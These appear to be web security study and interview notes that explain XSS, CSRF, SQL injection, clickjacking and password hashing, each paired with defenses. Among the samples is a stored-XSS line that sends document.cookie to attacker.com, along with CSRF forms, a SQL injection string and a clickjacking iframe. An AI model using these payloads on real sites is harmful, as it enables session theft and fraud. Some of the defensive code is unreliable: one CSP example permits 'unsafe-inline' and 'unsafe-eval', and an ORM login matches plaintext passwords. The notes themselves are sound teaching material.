### Web Security
Web security is an important field for protecting web applications from various attacks and threats.

#### 1. XSS (Cross-Site Scripting)
##### 1.1 Basic concepts
```javascript
// Reflected XSS
// Malicious URL
https://example.com/search?q=<script>alert('XSS')</script>

// Stored XSS
// Comment content
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>

// DOM-based XSS
// Unsafe DOM operation
document.write(location.hash.substring(1));
```

##### 1.2 Defenses
```javascript
// Input sanitization
function sanitizeInput(input) {
  return input.replace(/[&<>"']/g, function(match) {
    const entities = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    };
    return entities[match];
  });
}

// Output encoding
function encodeOutput(output) {
  return output.replace(/[&<>"']/g, function(match) {
    const entities = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    };
    return entities[match];
  });
}

// Use CSP
// Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval';
```

#### 2. CSRF (Cross-Site Request Forgery)
##### 2.1 Basic concepts
```html
<!-- Malicious form -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
  <input type="submit" value="Click to win!">
</form>
```

##### 2.2 Defenses
```javascript
// Use a CSRF Token
// Server generates the token
const csrfToken = generateToken();
res.cookie('csrf-token', csrfToken);

// Client sends the token
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': document.cookie.match(/csrf-token=([^;]+)/)[1]
  },
  body: JSON.stringify(data)
});

// Verify the token
app.use((req, res, next) => {
  const token = req.headers['x-csrf-token'];
  if (token !== req.cookies['csrf-token']) {
    return res.status(403).send('Invalid CSRF token');
  }
  next();
});
```

#### 3. SQL Injection
##### 3.1 Basic concepts
```sql
-- Malicious input
' OR '1'='1

-- Injected query
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```

##### 3.2 Defenses
```javascript
// Use parameterized queries
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [username, password]);

// Use an ORM
const user = await User.findOne({
  where: {
    username: username,
    password: password
  }
});
```

#### 4. Clickjacking
##### 4.1 Basic concepts
```html
<!-- Malicious iframe -->
<iframe src="https://bank.com" style="opacity: 0.1; position: absolute; top: 0; left: 0; width: 100%; height: 100%;"></iframe>
```

##### 4.2 Defenses
```javascript
// Use X-Frame-Options
res.setHeader('X-Frame-Options', 'DENY');

// Use CSP
res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
```

#### 5. Password security
##### 5.1 Basic concepts
```javascript
// Password hashing
const bcrypt = require('bcrypt');
const saltRounds = 10;

// Generate the hash
bcrypt.hash(password, saltRounds, function(err, hash) {
  // Store the hash
});

// Verify the password
bcrypt.compare(password, hash, function(err, result) {
  // Verification result
});
```

##### 5.2 Best practices
```javascript
// Password policy
const passwordPolicy = {
  minLength: 8,
  requireUppercase: true,
  requireLowercase: true,
  requireNumbers: true,
  requireSpecialChars: true
};

// Password validation
function validatePassword(password) {
  return (
    password.length >= passwordPolicy.minLength &&
    /[A-Z]/.test(password) &&
    /[a-z]/.test(password) &&
    /[0-9]/.test(password) &&
    /[!@#$%^&*]/.test(password)
  );
}
```

#### 6. Best practices
1. Use HTTPS
2. Implement CSP
3. Set security headers
4. Use parameterized queries
5. Implement CSRF protection
6. Store hashed passwords
7. Input validation
8. Output encoding
9. Session management
10. Error handling

#### 7. Common interview questions
1. **Common web attack types**
   - XSS
   - CSRF
   - SQL injection
   - Clickjacking

2. **How to defend against XSS**
   - Input sanitization
   - Output encoding
   - CSP configuration
   - Security header settings

3. **How to keep passwords safe**
   - Password hashing
   - Salting
   - Password policy
   - Secure storage

## Daily practice reference

### Day 62: Three kinds of XSS

| Type | Injection point | Stored | Example |
|------|----------|------|------|
| **Stored** | Server database | Persistent | Inject `<script>` in comments |
| **Reflected** | URL params | Not stored | Search `?q=<script>alert(1)</script>` |
| **DOM-based** | Client JS | Does not go through the server | `innerHTML = location.hash` |

### Day 62: XSS defense

| Layer | Measure |
|----|------|
| Output escaping | HTML entity encoding (`<` → `&lt;`); avoid `innerHTML` |
| CSP | `script-src 'self'` forbids inline scripts |
| HttpOnly | Set HttpOnly on cookies so JS cannot read them |
| Input validation | Allowlist filtering (mainly backend) |
| Framework defaults | React escapes by default; watch Vue `v-html` |

### Day 62: How a CSRF attack works

```text
User logs into site A → browser stores A's cookie
→ user visits malicious site B → B's page sends a request to A
→ browser automatically attaches A's cookie → A treats it as a user action
```

### Day 62: CSRF defense

| Measure | How it works |
|------|------|
| **SameSite Cookie** | `SameSite=Lax/Strict`; cross-site requests do not send the cookie |
| **CSRF Token** | Form includes a server-generated token the attacker cannot get |
| **Origin / Referer check** | Server checks the source origin |
| **CAPTCHA / second confirmation** | Add a human check on sensitive actions |

### Day 62: Common CSP directives

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://cdn.example.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
```

| Directive | Controls |
|------|------|
| `default-src` | Default policy |
| `script-src` | JS sources (`'nonce-xxx'` allows specific inline) |
| `style-src` | CSS sources |
| `img-src` | Image sources |
| `connect-src` | XHR / fetch / WebSocket sources |
| `frame-ancestors` | Who can embed this page (anti-clickjacking) |

### Day 62: XSS defense: output-escaping helper

```js
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
  }
  return str.replace(/[&<>"']/g, ch => map[ch])
}
```

### Day 62: CSRF attack flow

```text
User's browser
  ├─ already logged into bank.com (cookie: session=xxx)
  ├─ visits evil.com
  │   └─ <img src="https://bank.com/transfer?to=hacker&amount=10000">
  │       → the browser automatically attaches bank.com's cookie!
  └─ bank.com receives the request, treats it as a user action → transfer succeeds

Defense: SameSite=Lax → cross-site GET does not send the cookie → attack fails
```
